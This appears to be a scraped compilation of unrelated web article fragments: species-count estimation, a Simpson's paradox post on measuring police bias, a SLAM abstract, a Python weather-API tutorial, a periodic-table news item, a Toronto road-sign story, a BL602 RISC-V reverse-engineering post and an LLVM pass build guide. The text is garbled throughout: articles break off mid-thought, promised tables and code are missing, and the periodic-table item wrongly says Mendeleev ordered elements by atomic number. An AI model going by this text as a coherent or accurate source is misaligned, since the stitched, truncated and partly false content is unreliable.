<p>When Corbet returned to England, he asked R.A. Fisher to estimate the number of new species he would capture if he spent an additional 2 years trapping butterflies. This problem referred to the column of the table with frequency 0 (the unseen species in the population of Malayan butterflies), of which there was no data available. Fisher provided an elegant and simple answer to Corbet’s question, an alternating sum of the species frequencies: <span>\[\textrm{# New Species in 2 more years trapping}=118-74+44-24...=75\]</span> Good and Toulmin extended Fisher’s work using a surprisingly simple formula for estimating the number of novel species one would capture if they conducted a survey of <span>\(t\)</span> times the original survey effort. Although estimation was only good for <span>\(t&lt;1\)</span>. Realizing the limitations of previous estimators, and identified a family of estimators that could provably predict the number of novel species all the way up to <span>\(t \propto \log{n}\)</span> (<span>Orlitsky, Theertha, and Wu (2016)</span>). This family of estimators works by truncating the alternating series at a random location <span>\(L\)</span>, and then averages over the distribution of <span>\(L\)</span>. Indeed, the bias of the estimator depends on whether you truncate the series after an addition or subtraction term. Averaging the estimator over various cutoff locations helps control the bias.</p>
<p>I applied the Smoothed Good-Toulmin estimator available through the R package variantprobs, as well as the Chao estimate of the total number of unseen variants based on the training mutation frequencies.</p>

<h3>Smoothed Good-Turing Frequency Estimation: A Gentle Introduction</h3>
<p>Suppose, like Alexander Corbet, you are going to go for a butterfly catching expedition. After you strap on your boots, sun hat, and binoculars, you finally grab your notebook, a catalogue of the butterfly species you have encountered on previous expeditions. In your book, there is a list of butterfly species along with the number of times you have caught each species (above).</p>
<p>Where <span>\(N_1\)</span> denotes the number of species you caught once, <span>\(N_2\)</span> the number of species you caught twice, etc. But, like Corbet, you haven’t caught every butterfly in your field guide yet. There are some butterflies that remain unseen in your population. Instead of estimating how many butterfly species were unseen in the population, you are interested in the <em>probability</em> that you capture one of these rare butterfly species in your morning expedition.</p>
<p>If we want to calculate the probability that the next butterfly we catch belongs to <span>\(N_r\)</span> (was previously observed <span>\(r\)</span> times): <span>\(P(\textrm{Next object seen r …</span></p></div></div></div></div>

            <p>We want to know if things are fair. Do some groups of people tend to get a raw deal in company hiring or university admissions or court sentences?</p>

<p>There <em>seems</em> to be an obvious way to answer such questions: Get some data and “check” for bias. But different people often get different results, even when looking at the same data. What’s going on?</p>

<p>What’s going on is the whole strategy is <a href="https://dyno-might.github.io/2020/11/16/simpsons-paradox-and-the-tyranny-of-strata/">doomed</a>. It’s counterintuitive, but you usually <em>can’t</em> determine bias this way. The problem boils down to that in order to “check” for bias you must do something to your data called <em>stratification</em>. This can totally change the results, and there’s no single best way to do it.</p>



<p>Let’s do a thought experiment. You live in a city inhabited by blue people and red people. There are constant debates about if police are biased against either of these groups. Eventually, you decide to take action. You find 1024 blue men and 1024 red men, give each a suspicious looking stack of $20 bills and tell them to jog outside for an hour while holding the stack. Finally, you count the number that are arrested in each group.  (You have a <em>very</em> good relationship with your local <a href="https://en.wikipedia.org/wiki/Institutional_review_board">IRB</a>.)</p>



<p>So you run the experiment, and these are the results:</p>

<table>
  <thead>
    <tr>
      <th>blue total</th>
      <th>red total</th>
      <th>blue arrested</th>
      <th>red arrested</th>
      <th>% blue arrested</th>
      <th>% red arrested</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1024</td>
      <td>1024</td>
      <td>232</td>
      <td>280</td>
      <td>22.7</td>
      <td>27.3</td>
    </tr>
  </tbody>

<p>More reds were arrested than blues. Does this show police bias against reds?</p>



<p>You show your data to a friend. She notices that the blue men in your population were more often old (over 35) while the red men were more often young (35 or less). In particular, your data has these demographics:</p>

<table>
  <thead>
    <tr>
      <th>age</th>
      <th>blue total</th>
      <th>red total</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>old</td>
      <td>640</td>
      <td>384</td>
    </tr>
    <tr>
      <td>young</td>
      <td>384</td>
      <td>640</td>
    </tr>
  </tbody>
</table>

<p>She re-does your analysis separately for young and old men. The results are as follows:</p>

<table>
  <thead>
    <tr>
      <th>age</th>
      <th>blue total</th>
      <th>red total</th>
      <th>blue arrested</th>
      <th>red arrested</th>
      <th>% blue arrested</th>
      <th>% red arrested</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>old</td>
      <td>640</td>
      <td>384</td>
      <td>84</td>
      <td>44</td>
      <td>13.1</td>
      <td>11.5</td>
    </tr>
    <tr>
      <td>young</td>
      <td>384</td>
      <td>640</td>
      <td>148</td>
      <td>236</td>
      <td>38.5</td>
      <td>36.9</td>
    </tr>
  </tbody>
</table>

<p>Now this suggests a bias against <em>blue</em> men. The police arrest young blue men more often than young red men, and similarly for the old. The reason the previous analysis suggested a bias against red men is that more of them are young.</p>

<p>Does this now show that the police are biased against blues?</p>



<p>Your friend pokes at the data some more. She points out that reds are more likely to live in Riverview, while blues are more likely to live in Pineway. Specifically, you have these demographics:</p>

      <td>young</td>
      <td>128</td>
      <td>384</td>
    </tr>
  </tbody>
</table>

<p>She re-does the analysis for each location / age group. These are the results:</p>

<p>In each age-location group, reds were more often arrested than blues. The difference from the previous analysis is that blues tend to live in Pineway, and police more often arrest people in Pineway.</p>

<p>This suggests a bias against reds. But, given how things have changed in the past, something feels off…</p>



<p>Sweating, you ask your friend, “<em>Now</em> are we done?”</p>

<p>She says, “Almost! I just noticed that clothing seems to be a factor! Reds tend to wear joggers while blues tend to wear shorts. Just give me a second…”</p>

<p>She re-does the analysis yet again, with the following results.</p>

<p>Now, the percentages are exactly the same in each group. The police tend to arrest young men in Pineway wearing joggers. They tend not to arrest old men in Riverview wearing shorts. All the racial differences you saw before might be due to correlations between race and age, neighborhood, and attire, not because of race <em>itself</em>.</p>



<p>You tell your friend “Well done! You’ve resolved it. It’s getting late, I think I’ll be going…”</p>

<p>As you edge towards the door she says “Yeah, goodnight, let’s do this again! But before you leave, I did notice that some people wear headphones and some don’t…”</p>

<p>If you’re familiar with Simpson’s paradox, this is all basically an example of a <a href="https://dyno-might.github.io/2020/11/16/simpsons-paradox-and-the-tyranny-of-strata/">“recursive” Simpson’s paradox</a>.</p>



<p>What went “wrong” in this experiment? Suppose you gather data on police interactions with people of a single race. No one would be surprised if the statistics are different with respect to the young vs. old or urban vs. rural or rich vs. poor or churchgoers vs. nonreligious. It would be surprising if there <em>weren’t</em> differences.</p>

<p>Let’s say you want to use observational data to prove police are biased against red people. To do this, you need to split up all red and blue people into subgroups (“strata”) in such a way that each subgroup of red people is “exactly the same” as the corresponding subgroup, except for their race.</p>

<p>This is basically an impossible task. Human beings are complicated and multidimensional. To a first approximation, <a href="https://dyno-might.github.io/2020/10/08/police-violence-your-ratios-dont-prove-what-you-think-they-prove/">race is correlated with everything</a>. There’s just too many attributes to firmly establish that <em>any</em> observed difference is really due to race and not to something else that’s correlated with race. However much you try to split people up, there will still be remaining differences between each “red group” and each “blue group” you haven’t accounted for. For the same reason, you can’t use observational data to prove there <em>isn’t</em> bias.</p>

<p>If you want to measure fairness, you need to <em>intervene</em>. We’ll discuss that more next time.</p>

In doing so we propose a new formulation for an experience-based mapping framework as an effective solution to the key issues of city-scale SLAM scalability, robustness, map updates and all-time all-weather performance required by a production system. Furthermore, we propose an effective way of synchronising SLAM systems to deliver seamless real-time localisation of multiple edge devices at the same time. All this in the presence of network latency and bandwidth limitations. The resulting system is deployed and tested at scale in San Francisco where it delivers AR experiences in a mapped area of several hundred kilometers. To foster further development of this area we offer the data set to the public, constituting the largest of this kind to date.</p></div></div></div></div></div>

November 28, 2020 | https://www.pythonstacks.com/blog/generating-realtime-weather-data-python/ | <a href="https://web.archive.org/web/*/https://www.pythonstacks.com/blog/generating-realtime-weather-data-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>In this short tutorial, you will learn to obtain the realtime/current weather conditions of any city in python. We are going to make use of the weather API from <a href="https://www.weatherapi.com/" target="_blank"><span>www.weatherapi.com</span></a>.</p>

<p>WeatherAPI is a service that provides weather data, including realtime weather data, forecasts, and historical data to developers for use in applications and other services.</p>

<p>Before using their API, you have to signup for a free account and generate an API key. You will need the API key for accessing their service.</p>

<p>We will use the Python Requests module for accessing the API. If you are not familiar with Requests, checkout Introduction to <a href="https://www.pythonstacks.com/blog/making-requests-python-requests-library/">Python's Requests library</a>.</p>

<p>Install the requests module by running:</p>

<pre><code>pip install requests</code></pre>



<h2>Retrieving the Current weather data</h2>

<p>Before we make the request, first we will create these variables:</p>

<ol>
	<li>
	<p><code>base_url </code>, which stores the API's URL which is <span>http://api.weatherapi.com/v1.</span></p>
	</li>
	<li>
	<p><code>api_key</code>, stores your API key</p>
	</li>
	<li>
	<p><code>city</code>, the city whose weather data is needed.</p>
	</li>
</ol>



<pre><code>import requests

api_key = "your_API_key"
base_url = "http://api.weatherapi.com/v1"
city = "london"

parameters = {"key":api_key, "q":city}         # URL parameters
r = requests.get(f"{base_url}/current.json", params=parameters)

data = r.json()         # retrieve the json data

print(data)</code></pre>

<p><strong>output:</strong></p>

<pre><code>{'location': {'name': 'London', 'region': 'City of London, Greater London', 'country': 'United
Kingdom', 'lat': 51.52, 'lon': -0.11, 'tz_id': 'Europe/London', 'localtime_epoch': 1606304125,
'localtime': '2020-11-25 11:35'}, 'current': {'last_updated_epoch': 1606302905, 'last_updated': 
2020-11-25 11:15', 'temp_c': 13.0, 'temp_f': 55.4, 'is_day': 1, 'condition': {'text': 'Partly
cloudy', 'icon': '//cdn.weatherapi.com/weather/64x64/day/116.png', 'code': 1003}, 'wind_mph': 8.1,
'wind_kph': 13.0, 'wind_degree': 200, 'wind_dir': 'SSW', 'pressure_mb': 1011.0, 'pressure_in': 30.3,
'precip_mm': 0.1, 'precip_in': 0.0, 'humidity': 82, 'cloud': 75, 'feelslike_c': 11.9, 'feelslike_f':
53.5, 'vis_km': 10.0, 'vis_miles': 6.0, 'uv': 3.0, 'gust_mph': 11.9, 'gust_kph': 19.1}}</code></pre>

<p>The output is a python dictionary therefore, we can easily get the data we want from it by indexing.</p>

<p>Now let's parse this data into a nice piece of information</p>

<pre><code>import requests

api_key = "your_API_key"
base_url = "http://api.weatherapi.com/v1"
city = "london"

parameters = {"key":api_key, "q":city}         # URL parameters
r = requests.get(f"{base_url}/current.json", params=parameters)

data = r.json()         # retrieve json


# retriving Data

location = data['location']['name']
time = data['location']['localtime']

condition = data['current']['condition']['text']     
temperature_celcius = data['current']['temp_c']
temperature_farenheit = data['current']['temp_f']
feelslike_celcius = data['current']['feelslike_c']
wind_direction = data['current']['wind_dir']


# printing data
print(f"Location: {location}")
print(f"Current Time: {time}")
print()
print(f"Weather Condition: {condition}")
print(f"Temperature in Celcius: {temperature_celcius}")
print(f"Temperature in farenheit: {temperature_farenheit}")
print()
print(f"Temperature feels like: {feelslike_celcius} Celcius")
print(f"Wind Direction: {wind_direction}")</code></pre>

<p><strong>Output:</strong></p>

<pre><code>Location: London
Current Time: 2020-11-25 11:53

Weather Condition: Light rain
Temperature in Celcius: 14.0
Temperature in farenheit: 57.2

Temperature feels like: 13.1 Celcius
Wind Direction: SSW
</code></pre>

It seems 2019 was the best year for the periodic table as well with 2020 bringing bad news for it as scientists have proposed a new periodic table that seems to be more useful than the existing one.</p><p>That periodic table was created back in 1869 by Dmitri Mendeleev and it is one of the most significant achievements in science, capturing the essence not only of chemistry but also of physics, medicine, earth sciences, and biology.</p><p><a href="https://cdn.techjuice.pk/wp-content/uploads/2020/11/periodic.jpg"><img loading="lazy" src="https://cdn.techjuice.pk/wp-content/uploads/2020/11/periodic.jpg" alt="periodic.jpg" width="754" height="400" srcset="https://cdn.techjuice.pk/wp-content/uploads/2020/11/periodic.jpg 754w, https://cdn.techjuice.pk/wp-content/uploads/2020/11/periodic-300x159.jpg 300w, https://cdn.techjuice.pk/wp-content/uploads/2020/11/periodic-180x95.jpg 180w, https://cdn.techjuice.pk/wp-content/uploads/2020/11/periodic-360x191.jpg 360w" sizes="(max-width: 754px) 100vw, 754px"></a></p><p>You can see thousands of different versions of the periodic table ranging from spiral versions to simple lists but what made Mendeleev’s version so popular was the fact that he used an element’s atomic number to group them together and it showed that the grouped elements exhibited similar properties. People tried making more periodic tables using the number of electrons, neutrons, or a combination of both for newer tables but they all lacked something fundamental – similar behavior in different properties.</p><p>The <a href="https://pubs.acs.org/doi/abs/10.1021/acs.jpcc.0c07857" target="_blank" rel="nofollow">new periodic table</a> proposed by Zahed Allahyari and Artem Oganov using something called the Mendeleev Number (MN). Latest studies use a combination of two fundamental quantities to derive MN; an element’s atomic radius and a property called electronegativity which describes how strongly an atom attracts electrons to itself.</p><p>This approach groups together elements that can form binary compounds like Na and CL can make NaCl. It can help to predict the properties of binary compounds that haven’t been made yet. I’m not a chemist so you might derive more information from this approach. Nevertheless, it will be useful in the search for new materials without needing to test them physically.</p><p>Image Source: <a href="https://theconversation.com/periodic-table-scientists-propose-new-way-of-ordering-the-elements-150881" target="_blank" rel="nofollow">TheConversation</a></p><p>Like our stories?

        	<p>An unofficial addition has been made to a sign welcoming drivers to Toronto that casts the province’s capital in a less than flattering light.</p>
<p>The sign, on the border with Mississauga along Burnamthorpe Road, used to read “Welcome to Toronto. Ontario’s capital.” With the unauthorized addendum, it now reads “Ontario’s capital in overdose deaths.”</p>
<p>The addition appears to be a plank covered in a vinyl sign, printed to mimic the original sign’s colours and font, attached below it with zip-ties.</p>
<p>CityNews viewers alerted us to the changes and say a few signs in the area have been altered in this manner.</p>

<p>According to the chief coroner’s office, an estimated 50 to 80 people per week are dying of overdoses in Ontario.</p>
<p>Across the country, the COVID-19 pandemic has exacerbated the opioid crisis. Opioid overdoses have risen sharply since March as the border closure and limited access to services raise fatal risks for drug users.</p>
<p>It is unclear who created the additional signage and whether it is in fact referring to this disturbing rise in numbers — a stark reversal of the 13 per cent decline in fatal opioid overdoses between 2018 and 2019.</p>
<p>The signs were addressed in the city’s daily COVID-19 briefing question and answer session on Monday.</p>
<p>Mayor John Tory said he has repeatedly expressed “deep concern” about the overdose rates and feels not enough attention has been given to the issue.</p>
<p>“While this isn’t necessarily the single best way to draw attention to this, it is something that’s got us talking about it and I think the more we talk about it the more we advocate for greater action on the part of all governments,” said Tory.</p>
<p>Tory said Toronto Public Health has a “significant harm reduction program,” but added that the city needs more provincial support.</p>
<p>The city said the signs have been addressed by city staff and have now been corrected.</p>

<p>Pine64 is graciously giving away the <strong>PineCone BL602 RISC-V Evaluation Board</strong> to folks participating in the <a href="https://www.pine64.org/2020/10/28/nutcracker-challenge-blob-free-wifi-ble/"><strong>PineCone Nutcracker Challenge</strong></a>.</p>
<p>Let's learn about the PineCone Board... And how it helps the <a href="https://en.wikipedia.org/wiki/RISC-V"><strong>RISC-V Open Source Ecosystem</strong></a>.</p>

<p>PineCone is based on the BL602 combo chipset made by <a href="https://www.bouffalolab.com/bl602">Nanjing-based Bouffalo Lab</a>...</p>
<ol>
<li>
<p><strong>Low Cost</strong>: BL602 is a <a href="https://github.com/pine64/bl602-docs">General Purpose 32-bit Microcontroller</a>. (Think <a href="https://medium.com/@ly.lee/create-your-iot-gadget-with-apache-mynewt-and-stm32-blue-pill-d689b3ca725?source=friends_link&amp;sk=d511426d5a2217ebd06789b3eef7df54">STM32 Blue Pill</a>, <a href="https://medium.com/@ly.lee/coding-nrf52-with-rust-and-apache-mynewt-on-visual-studio-code-9521bcba6004?source=friends_link&amp;sk=bb4e2523b922d0870259ab3fa696c7da">Nordic nRF52</a>)</p>
<p>But BL602 supports Bluetooth LE AND 2.4 GHz WiFi... At the <strong>low low price of an ESP8266</strong>.</p>
<p><em>That's a game changer!</em></p>
</li>
<li>
<p><strong>Power Efficient</strong>: BL602 is perfect for wearables and other power-constrained devices. (Maybe even PineTime!)</p>
<p>By performance, BL602 belongs to the same class of microcontrollers as Nordic nRF52832. BL602 won't run Linux, <a href="https://lupyuen.github.io/pinetime-rust-mynewt/articles/pinetime">but neither does PineTime</a>.</p>
</li>
<li>
<p><strong>CPU is based on RISC-V, not Arm</strong>: Yep this scares most people, because BL602 will NOT run code compiled for Arm processors. Instead we need to use the <a href="https://xpack.github.io/riscv-none-embed-gcc/">32-bit RISC-V version of the GCC compiler</a> to recompile our programs.</p>
<p>FreeRTOS has been ported to BL602. (<a href="https://github.com/pine64/bl_iot_sdk/tree/master/components/bl602">More details</a>) But other Real Time Operating Systems (like <a href="https://www.zephyrproject.org/">Zephyr</a>, <a href="https://www.riot-os.org/">RIOT</a> and <a href="https://mynewt.apache.org/">Mynewt</a>) have been slow to adopt RISC-V. (We'll learn why in a while)</p>
<p>Rust runs perfectly fine on RISC-V microcontrollers. (<a href="https://medium.com/@ly.lee/porting-apache-mynewt-os-to-gigadevice-gd32-vf103-on-risc-v-4054a5922493?source=friends_link&amp;sk=215cd06186d912277d0469224666d60d">Here's the proof</a>)</p>
</li>
</ol>
<p>It's great that Pine64 is reaching out to the Open Source Community through the <a href="https://www.pine64.org/2020/10/28/nutcracker-challenge-blob-free-wifi-ble/">PineCone Nutcracker initiative</a>... Because it takes A Humongous Village to get BL602 ready for real-world gadgets.</p>

<p><em>How does BL602 compare with ESP32?</em></p>
<ul>
<li>
<p>BL602 is a <strong>General Purpose Microcontroller</strong> that supports Bluetooth LE and WiFi</p>
</li>
<li>
<p>ESP32 is more of a <strong>Bluetooth LE + WiFi Controller</strong> that supports Embedded Programs</p>
</li>
</ul>
<p>To folks who are familiar with Arm microcontrollers (STM32 Blue Pill, Nordic nRF52), BL602 looks like another microcontroller... Except that it runs on the <a href="https://riscv.org/technical/specifications/"><strong>RISC-V Instruction Set</strong></a> instead of Arm.</p>
<p>Hope this addresses the confusion over BL602, as discussed <a href="https://news.ycombinator.com/item?id=24916086">here</a> and <a href="https://news.ycombinator.com/item?id=24877335">here</a></p>
<p><em>(There's a new <a href="https://www.espressif.com/en/news/ESP32_C3">ESP32 based on RISC-V</a>, but the hardware is not available yet so we'll wait and see. <a href="https://twitter.com/MisterTechBlog/status/1332859286142128131?s=20">Compare BL602 with ESP32-C3</a>)</em></p>

<p><em>Why not stick with Arm? Why get adventurous with RISC-V?</em></p>
<p>Nintendo Switch (the #1 gaming console) runs on Arm. iPhone and the new M1 Macs also run on Arm.  <strong>Most of our gadgets are powered by Arm today.</strong></p>
<p>Before Arm gets too successful and locks us in... Shouldn't we explore alternatives like RISC-V?</p>

<p>32-bit RISC-V microcontrollers all run on the same core instruction set.</p>
<p><em>So the same firmware should run on different brands of RISC-V microcontrollers... Right?</em></p>
<p>Nope! Because across different brands of RISC-V microcontrollers...</p>
<ol>
<li>
<p><strong>Peripherals and Input/Output Ports</strong> are implemented differently: Timer, GPIO, UART, I2C, SPI, ...</p>
</li>
<li>
<p><strong>Exceptions and Interrupts</strong> also work differently on various RISC-V microcontrollers.</p>
<p>(FYI: Arm microcontrollers all handle Exceptions and Interrupts the same way)</p>
</li>
</ol>
<p>It's not so straightforward to port existing RISC-V firmware to BL602.</p>

<p><em>How bad is the RISC-V firmware portability problem?</em></p>
<p>Let's compare BL602 with the two most popular models of 32-bit RISC-V microcontrollers...</p>

<p>As we can see, firmware support is not so great for newer RISC-V microcontrollers.</p>
<p>Firmware created for Pinecil will NOT run on PineCone... Even the simplest firmware for blinking the LED!</p>

<p><em>How do we create portable firmware for RISC-V?</em></p>
<p>We'll have to isolate the differences with a layer of low-level firmware code known as the <strong>Hardware Abstraction Layer (HAL)</strong>.</p>
<p>So when we port the firmware from, say, Pinecil to PineCone, we need to replace the HAL for GD32 VF103 by the HAL for BL602.</p>
<p><a href="https://github.com/pine64/bl_iot_sdk/tree/master/components/hal_drv">Check out the BL602 HAL</a></p>

<p><em>Sounds like a lot of tedious repetitive work. Is there a sustainable way to create portable firmware for RISC-V?</em></p>
<p>Yes, by <strong>adopting a modern Embedded Operating System</strong> like <a href="https://mynewt.apache.org/">Mynewt</a>, <a href="https://www.riot-os.org/">RIOT</a> and <a href="https://www.zephyrproject.org/">Zephyr</a>.</p>
<p>These operating systems expose a high-level API for various Peripherals (Timers, GPIO, I2C, SPI, ...) that works across multiple microcontrollers (for both Arm and RISC-V).</p>
<p>But first we need to port Mynewt, RIOT and Zephyr to BL602. </p>
<p>The <a href="https://www.pine64.org/2020/10/28/nutcracker-challenge-blob-free-wifi-ble/"><strong>PineCone Nutcracker</strong></a> initiative helps to accelerate the porting process. We'll pool together the necessary skills and software from the Open Source Community, to make this work.</p>
<p><em>Is there hope for Mynewt / RIOT / Zephyr on BL602?</em></p>
<p>I shall be porting Mynewt + Rust to BL602, and documenting the porting process. </p>
<p>Why? Because it's an educational exercise that helps us better understand the BL602 internals.</p>
<p>And it will be a helpful reference for porting other Embedded Operating Systems to BL602.</p>
<p>Let's talk about the harder PineCone Nutcracker Challenge: Reverse engineering the Bluetooth LE and WiFi drivers for BL602...</p>
<p><img src="https://lupyuen.github.io/images/pinecone-compare.jpg" alt="BL602 Memory Map vs SiFive FE310: Totally different"></p>
<p><em>BL602 Memory Map (left) vs SiFive FE310 (right): Totally different</em></p>

<p>BL602 feels exciting. The mass market RISC-V microcontrollers never had onboard Bluetooth LE and WiFi... Until now!</p>
<p>Unfortunately we don't have complete documentation about the implementation of BLE and WiFi on BL602. (And I totally understand if there are commercial reasons for this omission)</p>
<p>But we have the compiled RISC-V libraries that we may Reverse Engineer to understand the BLE and WiFi implementation.</p>
<p>That's the crux of the <a href="https://www.pine64.org/2020/10/28/nutcracker-challenge-blob-free-wifi-ble/"><strong>PineCone Nutcracker Challenge</strong></a>... Decompile the Bluetooth LE and WiFi driver code, understand how the RISC-V code operates the wireless hardware.</p>
<p>Then reimplement the wireless functions the open source way. Perhaps by adapting the wireless drivers from <a href="https://mynewt.apache.org/">Mynewt</a> (<a href="https://github.com/apache/mynewt-nimble">NimBLE</a>), <a href="https://www.riot-os.org/">RIOT</a> and <a href="https://www.zephyrproject.org/">Zephyr</a>.</p>
<p>Let's walk through one possible approach for Reverse Engineering the WiFi Driver. (I'm sure there are many other ways to do this, <a href="https://github.com/pine64/bl602-docs/tree/main/hardware_notes">like this</a>)</p>

<p>From the <a href="https://github.com/bouffalolab/bl_docs/tree/main/BL602_RM/en">BL602 Reference Manual</a> (Page 17), we see that our RISC-V CPU talks to the WiFi Controller via the <strong><code>WRAM</code> Wireless RAM</strong> at address <code>0x4203 0000</code> onwards.</p>
<p><img src="https://lupyuen.github.io/images/pinecone-wram.png" alt="PineCone BL602 Wireless RAM"></p>
<p>Our WiFi Driver probably reads and writes WiFi packets to/from that 112 KB chunk of Shared Memory. The WiFi Control Registers may be inside too.</p>
<p>Let's find out which WiFi Driver functions use that chunk of RAM.</p>

<p>The WiFi Drivers that we wish to grok are located here...</p>
<ul>
<li><a href="https://github.com/pine64/bl602-re/tree/master/blobs">WiFi Drivers <code>github.com/pine64/bl602-re/blobs</code></a></li>
</ul>
<p>...Inside the files <a href="https://github.com/pine64/bl602-re/blob/master/blobs/libatcmd.a"><code>libatcmd.a</code></a> and <a href="https://github.com/pine64/bl602-re/blob/master/blobs/libbl602_wifi.a"><code>libbl602_wifi.a</code></a></p>
<p>Here is a sample BL602 app that calls the WiFi Functions in <code>libatcmd.a</code> and <code>libbl602_wifi.a</code>...</p>
<ul>
<li><a href="https://github.com/pine64/bl_iot_sdk/tree/master/customer_app/bl602_demo_at">Sample WiFi App <code>bl602_demo_at</code></a></li>
</ul>
<p>The PineCone Community has helpfully generated the <strong>GCC Linker Map</strong> for the <code>bl602_demo_at</code> firmware (which includes <code>libatcmd.a</code> and <code>libbl602_wifi.a</code>)...</p>
<ul>
<li><a href="https://github.com/pine64/bl602-re/blob/master/blobs/bl602_demo_at.map">Linker Map <code>bl602_demo_at.map</code></a></li>
</ul>
<p>I have loaded the <code>bl602_demo_at.map</code> Linker Map into a Google Sheet for analysis...</p>
<ol>
<li>
<p>Click here to open the Google Sheet: <a href="https://docs.google.com/spreadsheets/d/16yHquQ6E4bVj43piwQxssa1RaUr9yq9oL7hVf224Ijk/edit#gid=381366828&amp;fvid=1359565135">PineCone BL602 AT Demo Linker Map</a></p>

<p>Click <code>Data</code> ➜  <code>Filter Views</code> ➜  <code>All Objects By Size</code></p>

<p>It takes a while to sort the objects... Be patient</p>
</li>
</ol>
<p><img src="https://lupyuen.github.io/images/pinecone-linkermap.png" alt="PineCone BL602 AT Demo Linker Map"></p>
<p>Here we see the list of functions, global variables and static variables defined in <code>bl602_demo_at.map</code>, sorted by size. </p>
<p>Let's look at the first page of functions and variables.</p>
<p><em>(FYI: The Linker Maps loaded into Google Sheet for <a href="https://github.com/pine64/bl_iot_sdk/tree/master/customer_app/bl602_demo_wifi"><code>bl602_demo_wifi</code></a> and <a href="https://github.com/pine64/bl_iot_sdk/tree/master/customer_app/sdk_app_ble_sync"><code>sdk_app_ble_sync</code></a> are here: <a href="https://docs.google.com/spreadsheets/d/1m8-fc9_ocOwMuw_oRur4j6xqVli6x-Tm-M5ZIKwNWRk/edit#gid=381366828&amp;fvid=1359565135">Google Sheet for <code>bl602_demo_wifi</code></a>, <a href="https://docs.google.com/spreadsheets/d/1HJev8fdmIMyIxeRFx2cpsq1C5rEYgGZf7Tank3hYK88/edit#gid=381366828&amp;fvid=1359565135">Google Sheet for <code>sdk_app_ble_sync</code></a>)</em></p>

<p>Remember that Wireless RAM starts at address <code>0x4203 0000</code>?  I have highlighted in yellow the 19 largest variables in Wireless RAM...</p>

<div><pre><span>__bss_start</span>
<span>__wifi_bss_start</span>
<span>rx_dma_hdrdesc</span>
<span>_data_load</span>
<span>ram_heap</span>
...</pre></div>
<p>(The addresses of the variables are shown in the <code>Offset</code> column)</p>
<p>These are likely the WiFi Buffers that our WiFi Driver uses to send and receive WiFi packets, also to control the WiFi operation.</p>

<p><code>rx_dma_hdrdesc</code> looks interesting. It could be the DMA buffer for receiving WiFi packets.  Let's find out which WiFi Function in the WiFi Driver uses <code>rx_dma_hdrdesc</code>...</p>
<p>We'll scan for <code>rx_dma_hdrdesc</code> (and other interesting variables) in the <strong>Decompiled RISC-V Assembly Code</strong> (<code>*.s</code>) that the PineCone Community has generated...</p>
<ul>
<li>
<p><a href="https://github.com/pine64/bl602-re/tree/master/libatcmd"><code>libatcmd</code></a></p>
</li>
<li>
<p><a href="https://github.com/pine64/bl602-re/tree/master/libbl602_wifi"><code>libbl602_wifi</code></a></p>
</li>
</ul>
<p>Hopefully we'll be able to understand the Assembly Code and figure out how the WiFi Buffers are used to send and receive WiFi packets.</p>

<p>What's really inside the WiFi Controller? </p>
<p>Could there be some low-level chunk of executable code (non RISC-V) that runs <strong>inside</strong> the WiFi Controller to control the WiFi operations?</p>
<p>By studying the WiFi Buffers and the associated WiFi Functions, we may uncover the Code Blob that runs inside the WiFi Controller.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Compiling LLVM vs. using precompiled LLVM Libraries</h2><p>There are two options for creating your own LLVM pass: Your pass can either live directly inside the LLVM source tree or it can live outside in its own tree. In this blog post, I will go into detail about setting up an out of source LLVM pass.</p><p>The LLVM documentation suggests using a precompiled version of the LLVM libraries. This does come with some advantages and disadvantages.</p><p><img src="https://www.gymni.ch/images/table.svg"></p><p>To make your LLVM pass more flexible your build system should allow building either from source or from the precompiled LLVM libraries.</p><h2>Setting up the Build System</h2><p>Building a LLVM pass using the LLVM sources is not as simple as using precompiled LLVM libraries. LLVMs build system makes use of lots of custom CMake macros which have to be included in your build system for it to work right.</p><h2>Building the Pass</h2><h3>Detecting the configuration</h3><p>First we need to determine if we are building against the LLVM sources or a precompiled version of LLVM.</p><pre><code><span>if</span> <span>(</span><span>NOT</span> <span>PATH_TO_LLVM</span><span>)</span>

</code></pre><p>If we are using the precompiled LLVM libraries we use <code>PATH_TO_LLVM</code> to derive search paths CMake will look for the external project.</p><p><code>find_package</code> loads the CMake settings from the precompiled LLVM and allows us to manually add <code>LLVM_CMAKE_DIR</code> to the <code>CMAKE_MODULE_PATH</code>. Now CMake will find all the macros defined by the precompiled LLVM libraries.</p><p>In case we are building from LLVM sources things get a little bit simpler. We just have to create a subdirectory where we want to put the files that are created when building LLVM. We will save the directories containing all LLVM headers in <code>LLVM_INCLUDE_DIRS</code> for later use. At the end we again manually add the path to the CMake macros we want to use to <code>CMAKE_MODULE_PATH</code> .</p><pre><code><span>include</span><span>(</span><span>LLVM-Config</span><span>)</span>
<span>include</span><span>(</span><span>HandleLLVMOptions</span><span>)</span>

</code></pre><p>Now we can include the set of CMake modules we want to use in our build system. Those modules will allow us to use LLVM specific CMake functions and macros like <code>add_llvm_library</code> and <code>add_llvm_executable</code>.</p><h3>Including LLVM Headers</h3><p>The directories containing the LLVM headers we saved to <code>LLVM_INCLUDE_DIRS</code> before can now be included.</p><pre><code><span>include_directories</span><span>(</span><span>${</span><span>LLVM_INCLUDE_DIRS</span><span>}</span><span>)</span>
</code></pre><h3>Creating our Pass</h3><p>We are using the CMake function <code>add_llvm_library</code> to add our pass.</p><pre><code><span>add_llvm_library</span><span>(</span><span>OutOfTreeLLVMPass</span> <span>MODULE</span>

<span>)</span>
</code></pre><h2>Build the Pass</h2><p>After setting up the build system our pass can be built by creating a build directory and running CMake inside the build directory.</p><h3>Using sources</h3><p>Assuming the LLVM sources are located at <code>../llvm-project/llvm</code> and our pass is located at <code>../OutOfTreeLLVMPass</code></p><pre><code>cmake -DPATH_TO_LLVM<span>=</span>../llvm-project/llvm ../OutOfTreeLLVMPass

		<p><span><em>(5 minutes read)</em></span></p>
